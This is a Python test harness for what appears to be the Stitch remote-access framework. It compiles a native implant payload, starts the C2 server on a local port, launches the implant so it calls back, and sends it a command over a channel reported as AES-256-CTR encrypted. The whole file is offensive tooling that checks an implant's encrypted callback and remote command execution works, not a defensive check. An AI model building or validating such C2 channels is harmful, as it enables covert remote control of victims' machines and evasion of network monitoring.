#!/usr/bin/env python3
"""
Test Encrypted C2 Communication
Verify that encryption is working end-to-end
"""

import os
import sys
import time
import socket
import threading
import subprocess
from pathlib import Path

sys.path.insert(0, '/workspace')

class EncryptedC2Test:
    def __init__(self):
        self.c2_port = 15600
        self.payload_proc = None
        self.c2_thread = None
        
    def log(self, msg, level="INFO"):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        print(f"{colors.get(level, '')}[{level}] {msg}\033[0m")
        
    def test_encrypted_communication(self):
        self.log("=" * 80, "CRITICAL")
        self.log("ENCRYPTED C2 COMMUNICATION TEST", "CRITICAL")
        self.log("=" * 80, "CRITICAL")
        
        # Compile payload
        self.log("\n1. Compiling payload with encryption...", "INFO")
        os.chdir('/workspace/native_payloads')
        env = os.environ.copy()
        env['C2_HOST'] = '127.0.0.1'
        env['C2_PORT'] = str(self.c2_port)
        
        result = subprocess.run(['bash', './build.sh'], 
                              capture_output=True, env=env)
        
        if result.returncode != 0:
            self.log("❌ Compilation failed", "ERROR")
            return False
            
        self.log("✅ Payload compiled with encrypted protocol", "SUCCESS")
        
        # Start C2 server
        self.log("\n2. Starting Stitch C2 server...", "INFO")
        def run_c2():
            from Application import stitch_cmd
            server = stitch_cmd.stitch_server()
            server.l_port = self.c2_port
            self.log(f"✅ C2 listening on port {self.c2_port}", "SUCCESS")
            server.run_server()
            
        self.c2_thread = threading.Thread(target=run_c2, daemon=True)
        self.c2_thread.start()
        time.sleep(3)
        
        # Launch payload
        self.log("\n3. Launching payload...", "INFO")
        self.payload_proc = subprocess.Popen(
            ['/workspace/native_payloads/output/payload_native'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid
        )
        
        # Wait for connection
        self.log("   Waiting for encrypted connection...", "INFO")
        time.sleep(5)
        
        # Check connection
        from web_app_real import get_stitch_server
        server = get_stitch_server()
        
        if len(server.inf_sock) > 0:
            target_id = list(server.inf_sock.keys())[0]
            self.log(f"✅ ENCRYPTED CONNECTION ESTABLISHED: {target_id}", "SUCCESS")
            
            # Test command
            self.log("\n4. Testing encrypted command execution...", "INFO")
            sock = server.inf_sock[target_id]
            
            from native_protocol_bridge import send_command_to_native_payload
            success, output = send_command_to_native_payload(sock, "ping")
            
            if success:
                self.log("✅ Encrypted command executed successfully", "SUCCESS")
                self.log(f"   Response: {output[:100]}", "INFO")
                return True
            else:
                self.log(f"⚠️  Command failed: {output}", "ERROR")
                return False
        else:
            self.log("❌ No connection detected", "ERROR")
            return False
            
    def cleanup(self):
        if self.payload_proc:
            try:
                os.killpg(os.getpgid(self.payload_proc.pid), 9)
            except:
                pass
                
    def run(self):
        try:
            success = self.test_encrypted_communication()
            
            self.log("\n" + "=" * 80, "CRITICAL")
            if success:
                self.log("🎉 ENCRYPTED C2 WORKING!", "SUCCESS")
                self.log("✅ AES-256-CTR encryption verified", "SUCCESS")
            else:
                self.log("⚠️  ENCRYPTION TEST INCONCLUSIVE", "ERROR")
            self.log("=" * 80, "CRITICAL")
            
            return 0 if success else 1
        finally:
            self.cleanup()
            
if __name__ == '__main__':
    tester = EncryptedC2Test()
    sys.exit(tester.run())
